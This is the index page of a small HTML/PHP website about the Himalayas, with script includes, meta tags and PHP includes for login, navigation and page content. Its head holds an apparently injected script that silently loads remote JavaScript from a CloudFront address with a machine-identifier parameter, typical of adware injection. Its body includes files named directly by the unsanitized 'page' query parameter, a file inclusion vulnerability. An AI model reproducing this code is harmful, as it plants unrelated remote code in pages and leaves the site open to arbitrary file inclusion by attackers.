<!DOCTYPE html>
<head>
  <script type="text/javascript" src="jquery-1.12.1.min.js"></script>
  <script type="text/javascript" src="script.js"></script>
  <script type="text/javascript" src="form-script.js"></script>
  
  <!-- gallery plug in -->
  <script src="jquery.min.js"></script>
  <script src="Responsiveslides.min.js"></script>
  <link rel="stylesheet" href="teme.css" media="screen" title="no title" charset="utf-8">
  <!-- end of plugin -->

  <meta charset="UTF-8">
  <meta name="keywords" content="The Himalayas, Himalayas, Mount Everest, K2, mountains, highest mountains, Asia mountains"/>
  <meta name="description" content="This site is dedicated to the natural wonders of the largest mountain range in the world."/>
  <meta name="author" content="Marko Veljković"/>
  <meta name="copyright" content="Marko Veljković"/>
  <link rel="shortcut icon" href="img/favicon.png" sizes="20x20">
  <link rel="stylesheet" href="stil.css">
  <title>Home</title>
  <script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";
  a.async=!0;a.src= "http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.132#p=wdcxwd2500bevs-22ust0_wd-wxe308a3225432254";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();
  </script>
</head>

	<body>

		<?php
			include ('connect.inc');
			include ('login.php');
			include ('pages/register.php');
		?>
	 
		<?php
			include ('pages/nav.php');
		?>
 
	<div id="content">
		 <div class="sections">
		 
			 <?php
				 if(!isset($_GET['page']))
					 {
						include ("pages/home.php");
					 }
				 
				 if(isset($_GET['page']))
					 {
						include ("pages/home.php");
						$page = $_GET['page'];
						include ("pages/$page.php");
					 }
			 ?>
					
		 </div>
	</div>

	<?php
		include ("pages/footer.php");
	?>
	 
</body>

</html>